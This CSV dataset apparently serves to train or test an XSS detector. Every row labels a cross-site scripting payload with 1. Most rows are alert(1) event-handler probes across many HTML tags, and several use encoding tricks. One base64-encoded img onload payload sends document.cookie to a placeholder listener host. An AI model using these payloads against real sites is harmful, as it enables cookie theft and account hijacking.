Sentence,Label
"<content onmouseout=""alert(1)"">test</content>",1
"<q draggable=""true"" ondragleave=""alert(1)"">test</q>",1
<map id=x tabindex=1 onfocusin=alert(1)></map>,1
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",1
<img2 onpointerup=alert(1)>XSS</img2>,1
"<dl onmousemove=""alert(1)"">test</dl>",1
<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>,1
"<center onkeydown=""alert(1)"" contenteditable>test</center>",1
"echo('IPT>alert("""")</SCRIPT>')",1
"<ul oncut=""alert(1)"" contenteditable>test</ul>",1
"<header draggable=""true"" ondrag=""alert(1)"">test</header>",1
<button onblur=alert(1) id=x></button><input autofocus>,1
<select onpointerdown=alert(1)>XSS</select>,1
"<figure onclick=""alert(1)"">test</figure>",1
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",1
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>",1
"<nav oncontextmenu=""alert(1)"">test</nav>",1
"<menuitem onmouseup=""alert(1)"">test</menuitem>",1
<spacer onpointerenter=alert(1)>XSS</spacer>,1
"<applet ondblclick=""alert(1)"">test</applet>",1
"<tbody onbeforepaste=""alert(1)"" contenteditable>test</tbody>",1
<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,1
"<strong onmouseover=""alert(1)"">test</strong>",1
"<style>:target {color: red;}</style><div id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></div>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",1
<rt id=x tabindex=1 onactivate=alert(1)></rt>,1
"<dt onkeydown=""alert(1)"" contenteditable>test</dt>",1
<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>,1
"<header onmouseout=""alert(1)"">test</header>",1
"<option draggable=""true"" ondrag=""alert(1)"">test</option>",1
"<em oncopy=""alert(1)"" contenteditable>test</em>",1
top[“al”+”ert”](1),1
<a id=x tabindex=1 onactivate=alert(1)></a>,1
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",1
"<div onkeydown=""alert(1)"" contenteditable>test</div>",1
<embed onpointerdown=alert(1)>XSS</embed>,1
"<body onkeyup=""alert(1)"" contenteditable>test</body>",1
<picture onpointerleave=alert(1)>XSS</picture>,1
<command id=x tabindex=1 onfocusin=alert(1)></command>,1
"<dd onmouseup=""alert(1)"">test</dd>",1
"<details onpaste=""alert(1)"" contenteditable>test</details>",1
"<textarea onmouseleave=""alert(1)"">test</textarea>",1
"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",1
<spacer onpointerover=alert(1)>XSS</spacer>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rt>",1
"<div draggable=""true"" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>",1
<figure id=x tabindex=1 onactivate=alert(1)></figure>,1
"<dd oncopy=""alert(1)"" contenteditable>test</dd>",1
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",1
"<select draggable=""true"" ondragstart=""alert(1)"">test</select>",1
<svg><ins onload=alert(1)></ins>,1
"<noembed onmouseup=""alert(1)"">test</noembed>",1
"<isindex onkeypress=""alert(1)"" contenteditable>test</isindex>",1
<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></table>",1
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",1
"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",1
"<fieldset draggable=""true"" ondrag=""alert(1)"">test</fieldset>",1
<p onpointermove=alert(1)>XSS</p>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></noframes>",1
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,1
<set onpointerenter=alert(1)>XSS</set>,1
<frameset onpointerleave=alert(1)>XSS</frameset>,1
<frame onpointerout=alert(1)>XSS</frame>,1
"<meter onbeforecut=""alert(1)"" contenteditable>test</meter>",1
"<video onmouseup=""alert(1)"">test</video>",1
"<shadow draggable=""true"" ondragstart=""alert(1)"">test</shadow>",1
<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>,1
<section onpointerenter=alert(1)>XSS</section>,1
"<param draggable=""true"" ondragend=""alert(1)"">test</param>",1
<u onpointermove=alert(1)>XSS</u>,1
"<p oncontextmenu=""alert(1)"">test</p>",1
"<dd onpaste=""alert(1)"" contenteditable>test</dd>",1
<base onpointerleave=alert(1)>XSS</base>,1
<nextid id=x tabindex=1 onbeforedeactivate=alert(1)></nextid><input autofocus>,1
"<nobr onkeypress=""alert(1)"" contenteditable>test</nobr>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rp>",1
<iframe id=x onfocusin=alert(1)>,1
"<img onload=""eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"">",1
"<style>:target {color: red;}</style><slot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></slot>",1
<animatetransform onpointermove=alert(1)>XSS</animatetransform>,1
"<mark ondblclick=""alert(1)"">test</mark>",1
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",1
<nextid onpointerdown=alert(1)>XSS</nextid>,1
"<style>:target {transform: rotate(180deg);}</style><figcaption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></figcaption>",1
"<link onmouseenter=""alert(1)"">test</link>",1
"<title onbeforecopy=""alert(1)"" contenteditable>test</title>",1
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdo>",1
"<ins onmousemove=""alert(1)"">test</ins>",1
"<rt oncontextmenu=""alert(1)"">test</rt>",1
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",1
"<style>@keyframes slidein {}</style><colgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></colgroup>",1
"<a oncut=""alert(1)"" contenteditable>test</a>",1
"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",1
<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>,1
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1
<frame onpointermove=alert(1)>XSS</frame>,1
"<bdi onmouseleave=""alert(1)"">test</bdi>",1
"<big onmousemove=""alert(1)"">test</big>",1
"<style>:target {transform: rotate(180deg);}</style><data id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></data>",1
"<rp onmouseup=""alert(1)"">test</rp>",1
"<template onmousemove=""alert(1)"">test</template>",1
<s onpointerleave=alert(1)>XSS</s>,1
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",1
"<keygen draggable=""true"" ondragend=""alert(1)"">test</keygen>",1
<fieldset id=x tabindex=1 ondeactivate=alert(1)></fieldset><input id=y autofocus>,1
"<html onmouseenter=""alert(1)"">test</html>",1
<base onpointerenter=alert(1)>XSS</base>,1
"<head onmouseover=""alert(1)"">test</head>",1
<abbr onpointerdown=alert(1)>XSS</abbr>,1
"<main ondblclick=""alert(1)"">test</main>",1
<menuitem onpointerout=alert(1)>XSS</menuitem>,1
"<rp draggable=""true"" ondragend=""alert(1)"">test</rp>",1
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,1
"<hr onmousedown=""alert(1)"">test</hr>",1
"<nextid oncontextmenu=""alert(1)"">test</nextid>",1
"<style onbeforepaste=""alert(1)"" contenteditable>test</style>",1
"<tr ondblclick=""alert(1)"">test</tr>",1
"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",1
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,1
"<form oncut=""alert(1)"" contenteditable>test</form>",1
"<main draggable=""true"" ondrag=""alert(1)"">test</main>",1
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>",1
<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>,1
<rp onpointerleave=alert(1)>XSS</rp>,1
<big id=x tabindex=1 onactivate=alert(1)></big>,1
<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>,1
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",1
"<dl ondblclick=""alert(1)"">test</dl>",1
<frameset onpointerdown=alert(1)>XSS</frameset>,1
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,1
"<script onkeydown=""alert(1)"" contenteditable>test</script>",1
"<u onmouseout=""alert(1)"">test</u>",1
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionend=alert(1)></tr>",1
"<plaintext draggable=""true"" ondragenter=""alert(1)"">test</plaintext>",1
"<applet onkeyup=""alert(1)"" contenteditable>test</applet>",1
"<header draggable=""true"" ondragleave=""alert(1)"">test</header>",1
"<dialog onmouseleave=""alert(1)"">test</dialog>",1
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,1
"<picture onmouseenter=""alert(1)"">test</picture>",1
"<style>:target {transform: rotate(180deg);}</style><details id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></details>",1
<custom tags onpointerdown=alert(1)>XSS</custom tags>,1
"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" ontransitionend=alert(1)></source>",1
<audio onpointerup=alert(1)>XSS</audio>,1
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,1
"<style>:target {transform: rotate(180deg);}</style><command id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></command>",1
"<strike draggable=""true"" ondragenter=""alert(1)"">test</strike>",1
<listing id=x tabindex=1 onfocus=alert(1)></listing>,1
"<button onkeydown=""alert(1)"" contenteditable>test</button>",1
<time onpointerenter=alert(1)>XSS</time>,1
<time id=x tabindex=1 onactivate=alert(1)></time>,1
"<div onmousedown=""alert(1)"">test</div>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></samp>",1
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationend=""alert(1)""></tr>",1
"<svg onkeypress=""alert(1)"" contenteditable>test</svg>",1
"<br onmouseenter=""alert(1)"">test</br>",1
"<span oncopy=""alert(1)"" contenteditable>test</span>",1
"<u onpaste=""alert(1)"" contenteditable>test</u>",1
<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>,1
<samp onpointermove=alert(1)>XSS</samp>,1
"<meter onmouseover=""alert(1)"">test</meter>",1
"<source onmousemove=""alert(1)"">test</source>",1
"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>",1
"<samp oncontextmenu=""alert(1)"">test</samp>",1
"<spacer onmouseover=""alert(1)"">test</spacer>",1
"<caption onkeyup=""alert(1)"" contenteditable>test</caption>",1
"<h1 oncut=""alert(1)"" contenteditable>test</h1>",1
"<rt onkeypress=""alert(1)"" contenteditable>test</rt>",1
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",1
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",1
<kbd onpointermove=alert(1)>XSS</kbd>,1
"<meta onmouseover=""alert(1)"">test</meta>",1
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",1
"<head onmouseup=""alert(1)"">test</head>",1
"<var onkeyup=""alert(1)"" contenteditable>test</var>",1
<iframe onpointerdown=alert(1)>XSS</iframe>,1
"<menu onclick=""alert(1)"">test</menu>",1
"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",1
"<A HREF=""http://0x42.0x0000066.0x7.0x93/""></A>",1
"<bdo onkeydown=""alert(1)"" contenteditable>test</bdo>",1
"<font ondblclick=""alert(1)"">test</font>",1
"<shadow oncontextmenu=""alert(1)"">test</shadow>",1
"<SCRIPT a="">"" SRC=""httx://.rocks/.js""></SCRIPT>",1
"<picture oncut=""alert(1)"" contenteditable>test</picture>",1
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationend=""alert(1)""></noscript>",1
<header onpointermove=alert(1)>XSS</header>,1
"<style>:target {color:red;}</style><input id=x style=""transition:color 1s"" ontransitionend=alert(1)></input>",1
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",1
<input3 onpointerover=alert(1)>XSS</input3>,1
"<SCRIPT DEFER>alert("""")</SCRIPT>",1
<plaintext onpointermove=alert(1)>XSS</plaintext>,1
<track onpointermove=alert(1)>XSS</track>,1
"<dt draggable=""true"" ondragenter=""alert(1)"">test</dt>",1
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",1
<bdi onpointerover=alert(1)>XSS</bdi>,1
"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1
<spacer onpointerup=alert(1)>XSS</spacer>,1
"<input onpaste=alert(1) value="""" autofocus>",1
<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>,1
<svg id=x onfocusin=alert(1)>,1
<frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>,1
<dialog onpointerenter=alert(1)>XSS</dialog>,1
<image src=validimage.png onloadstart=alert(1)>,1
"<style>@keyframes x{}</style><a style=""animation-name:x"" 									onanimationend=""alert(1)""></a>",1
"<style>@keyframes slidein {}</style><dl style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dl>",1
<acronym onpointerup=alert(1)>XSS</acronym>,1
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",1
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationend=""alert(1)""></th>",1
<form><button formaction=javascript&colon;alert(1)>,1
<time onpointerleave=alert(1)>XSS</time>,1
"<hgroup onpaste=""alert(1)"" contenteditable>test</hgroup>",1
"<style>:target {color:red;}</style><spacer id=x style=""transition:color 1s"" ontransitionend=alert(1)></spacer>",1
"<tt onmouseenter=""alert(1)"">test</tt>",1
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationend=""alert(1)""></li>",1
"<data onkeydown=""alert(1)"" contenteditable>test</data>",1
"<time onmouseenter=""alert(1)"">test</time>",1
"a=alert,a(1)",1
"<dialog onmouseup=""alert(1)"">test</dialog>",1
<output id=x tabindex=1 onfocus=alert(1)></output>,1
"<span onkeypress=""alert(1)"" contenteditable>test</span>",1
<progress onpointerup=alert(1)>XSS</progress>,1
"<IMG SRC=""jav&#x0A;ascript:alert('');"">",1
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",1
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>",1
<rb id=x tabindex=1 onfocusin=alert(1)></rb>,1
"<main onmouseout=""alert(1)"">test</main>",1
<em onfocusout=alert(1) tabindex=1 id=x></em><input autofocus>,1
"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" ontransitionend=alert(1)></h1>",1
"<a onmousemove=""alert(1)"">test</a>",1
"<cite draggable=""true"" ondragenter=""alert(1)"">test</cite>",1
<colgroup onpointermove=alert(1)>XSS</colgroup>,1
"<multicol onkeypress=""alert(1)"" contenteditable>test</multicol>",1
"<picture onbeforecut=""alert(1)"" contenteditable>test</picture>",1
<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>,1
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1
"<style>@keyframes slidein {}</style><b style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></b>",1
"<output onmouseenter=""alert(1)"">test</output>",1
"<content oncopy=""alert(1)"" contenteditable>test</content>",1
<content id=x tabindex=1 onfocusin=alert(1)></content>,1
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationend=""alert(1)""></samp>",1
"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",1
"<sub onmouseover=""alert(1)"">test</sub>",1
<rp id=x tabindex=1 onactivate=alert(1)></rp>,1
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",1
top[/al/.source+/ert/.source](1),1
"<header onbeforepaste=""alert(1)"" contenteditable>test</header>",1
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",1
"<svg onmouseout=""alert(1)"">test</svg>",1
<dialog onpointermove=alert(1)>XSS</dialog>,1
"<hr oncontextmenu=""alert(1)"">test</hr>",1
<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>,1
"<slot draggable=""true"" ondragend=""alert(1)"">test</slot>",1
"<tt onbeforecopy=""alert(1)"" contenteditable>test</tt>",1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></section>",1
"<menu onmouseenter=""alert(1)"">test</menu>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></shadow>",1
<em onpointerdown=alert(1)>XSS</em>,1
<figure onpointerleave=alert(1)>XSS</figure>,1
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationstart=""alert(1)""></audio>",1
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>,1
"<hr onmouseout=""alert(1)"">test</hr>",1
<set onpointerover=alert(1)>XSS</set>,1
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",1
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",1
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,1
<noscript onpointerup=alert(1)>XSS</noscript>,1
"<br onkeypress=""alert(1)"" contenteditable>test</br>",1
<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>,1
"<big onkeydown=""alert(1)"" contenteditable>test</big>",1
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onanimationend=""alert(1)""></nav>",1
<svg><label onload=alert(1)></label>,1
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,1
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,1
"<address draggable=""true"" ondragend=""alert(1)"">test</address>",1
"<table onkeydown=""alert(1)"" contenteditable>test</table>",1
<dfn onpointerup=alert(1)>XSS</dfn>,1
<input type=image onloadstart=alert(1) src=validimage.png>,1
"<blink onmousedown=""alert(1)"">test</blink>",1
"<iframe onmouseleave=""alert(1)"">test</iframe>",1
"<menu onpaste=""alert(1)"" contenteditable>test</menu>",1
<ul onpointerdown=alert(1)>XSS</ul>,1
"<a onmouseover=""alert(1)"">test</a>",1
"<rp onkeydown=""alert(1)"" contenteditable>test</rp>",1
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,1
"<mark onbeforecut=""alert(1)"" contenteditable>test</mark>",1
<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,1
"<source onclick=""alert(1)"">test</source>",1
<svg><font onload=alert(1)></font>,1
"<b draggable=""true"" ondrag=""alert(1)"">test</b>",1
<table onpointerleave=alert(1)>XSS</table>,1
<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>,1
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>,1
<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>,1
"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",1
<footer onpointermove=alert(1)>XSS</footer>,1
"<legend draggable=""true"" ondragend=""alert(1)"">test</legend>",1
<svg><summary onload=alert(1)></summary>,1
"<legend onmouseout=""alert(1)"">test</legend>",1
"<td onmouseout=""alert(1)"">test</td>",1
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",1
"<area onmouseout=""alert(1)"">test</area>",1
"<header onkeydown=""alert(1)"" contenteditable>test</header>",1
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,1
"<thead ondblclick=""alert(1)"">test</thead>",1
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",1
<template id=x tabindex=1 onfocusin=alert(1)></template>,1
"<xmp onmouseenter=""alert(1)"">test</xmp>",1
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",1
"<style>@keyframes slidein {}</style><area style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></area>",1
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",1
"<summary onkeydown=""alert(1)"" contenteditable>test</summary>",1
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationend=""alert(1)""></picture>",1
"<area onmousedown=""alert(1)"">test</area>",1
"<code oncut=""alert(1)"" contenteditable>test</code>",1
"<datalist onmouseenter=""alert(1)"">test</datalist>",1
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></center>",1
"<address oncopy=""alert(1)"" contenteditable>test</address>",1
<svg><i onload=alert(1)></i>,1
"document.getElementsByClassName("""").length",1
"<image onkeydown=""alert(1)"" contenteditable>test</image>",1
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationstart=""alert(1)""></th>",1
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationend=""alert(1)""></code>",1
"<legend onpaste=""alert(1)"" contenteditable>test</legend>",1
"<style>@keyframes slidein {}</style><big style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></big>",1
<animatemotion onpointerenter=alert(1)>XSS</animatemotion>,1
"<noembed onpaste=""alert(1)"" contenteditable>test</noembed>",1
"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>",1
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationend=""alert(1)""></b>",1
<link onpointerdown=alert(1)>XSS</link>,1
<table onpointerup=alert(1)>XSS</table>,1
"<u draggable=""true"" ondrag=""alert(1)"">test</u>",1
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",1
"<nobr onmousedown=""alert(1)"">test</nobr>",1
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,1
"<noframes onmouseenter=""alert(1)"">test</noframes>",1
"<style>@keyframes x{}</style><data style=""animation-name:x"" onanimationend=""alert(1)""></data>",1
"<image onmousedown=""alert(1)"">test</image>",1
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,1
"<applet code=""javascript:confirm(document.cookie);"">",1
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>,1
"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></plaintext>",1
<mark onpointerdown=alert(1)>XSS</mark>,1
<font id=x tabindex=1 onactivate=alert(1)></font>,1
"<style>:target {color:red;}</style><noembed id=x style=""transition:color 1s"" ontransitionend=alert(1)></noembed>",1
"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=alert(1)></address>",1
<header id=x tabindex=1 onfocusin=alert(1)></header>,1
"<details draggable=""true"" ondragleave=""alert(1)"">test</details>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></content>",1
<BODY ONLOAD=alert('')>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dfn>",1
"<figcaption onmouseenter=""alert(1)"">test</figcaption>",1
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",1
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",1
"<FRAME SRC=""javascript:alert('')",1
"<big onkeyup=""alert(1)"" contenteditable>test</big>",1
"<b oncontextmenu=""alert(1)"">test</b>",1
"<address onmouseover=""alert(1)"">test</address>",1
"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",1
"<em onpaste=""alert(1)"" contenteditable>test</em>",1
"<em onbeforecopy=""alert(1)"" contenteditable>test</em>",1
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",1
"<bdi onkeypress=""alert(1)"" contenteditable>test</bdi>",1
"<link onbeforecut=""alert(1)"" contenteditable>test</link>",1
"<dfn oncut=""alert(1)"" contenteditable>test</dfn>",1
"<noframes onkeypress=""alert(1)"" contenteditable>test</noframes>",1
"<center onmousemove=""alert(1)"">test</center>",1
"<progress onmouseenter=""alert(1)"">test</progress>",1
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",1
<menuitem onpointerup=alert(1)>XSS</menuitem>,1
"<marquee onmouseleave=""alert(1)"">test</marquee>",1
<main id=x tabindex=1 onbeforeactivate=alert(1)></main>,1
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>",1
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationstart=""alert(1)""></isindex>",1
"<cite onmouseout=""alert(1)"">test</cite>",1
"<i onbeforecopy=""alert(1)"" contenteditable>test</i>",1
<noembed id=x tabindex=1 onactivate=alert(1)></noembed>,1
<image3 onpointerout=alert(1)>XSS</image3>,1
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,1
al\u0065rt(1),1
"<samp onbeforepaste=""alert(1)"" contenteditable>test</samp>",1
<area onpointermove=alert(1)>XSS</area>,1
"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",1
<noframes onpointerup=alert(1)>XSS</noframes>,1
"<base onpaste=""alert(1)"" contenteditable>test</base>",1
"<em onmouseup=""alert(1)"">test</em>",1
<acronym onpointermove=alert(1)>XSS</acronym>,1
"<br oncopy=""alert(1)"" contenteditable>test</br>",1
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,1
<strong id=x tabindex=1 onfocus=alert(1)></strong>,1
"<style>:target {color: red;}</style><q id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></q>",1
"<slot onkeydown=""alert(1)"" contenteditable>test</slot>",1
"<div draggable=""true"" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>",1
<u onpointerenter=alert(1)>XSS</u>,1
<img src=x:alert(alt) onerror=eval(src) alt=0>,1
<slot id=x tabindex=1 onfocus=alert(1)></slot>,1
"<h1 onclick=""alert(1)"">test</h1>",1
<code onpointerleave=alert(1)>XSS</code>,1
"<fieldset onkeypress=""alert(1)"" contenteditable>test</fieldset>",1
